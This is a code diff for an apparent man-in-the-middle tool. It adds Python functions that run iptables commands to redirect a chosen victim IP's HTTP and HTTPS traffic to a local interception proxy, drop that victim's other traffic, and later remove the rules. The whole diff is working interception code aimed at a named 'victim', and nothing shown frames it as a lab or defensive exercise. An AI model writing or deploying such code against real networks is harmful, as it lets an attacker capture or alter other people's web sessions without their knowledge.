@@ -59,3 +59,34 @@ def disable_forwarding(iface: str) -> None:
     _run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "ACCEPT"])
     _run(["iptables", "-D", "FORWARD", "-o", iface, "-j", "ACCEPT"])
     set_ip_forward(False)
+
+
+
+def enable_redirect(iface: str, victim_ip: str, proxy_port: int) -> bool:
+    """
+    Disable kernel forwarding and redirect victim TCP to our proxy port.
+    Only TCP 80 and 443 are redirected — everything else is dropped.
+    """
+    ok = set_ip_forward(False)  # we do NOT want the kernel to forward
+    # Redirect TCP 80 and 443 from the victim to our proxy
+    _run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+          "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "80",
+          "-j", "REDIRECT", "--to-ports", str(proxy_port)])
+    _run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+          "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "443",
+          "-j", "REDIRECT", "--to-ports", str(proxy_port)])
+    # Drop everything else from the victim that isn't to us
+    _run(["iptables", "-I", "FORWARD", "1",
+          "-i", iface, "-s", victim_ip, "-j", "DROP"])
+    return ok
+
+
+def disable_redirect(iface: str, victim_ip: str, proxy_port: int) -> None:
+    _run(["iptables", "-t", "nat", "-D", "PREROUTING",
+          "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "80",
+          "-j", "REDIRECT", "--to-ports", str(proxy_port)])
+    _run(["iptables", "-t", "nat", "-D", "PREROUTING",
+          "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "443",
+          "-j", "REDIRECT", "--to-ports", str(proxy_port)])
+    _run(["iptables", "-D", "FORWARD",
+          "-i", iface, "-s", victim_ip, "-j", "DROP"])
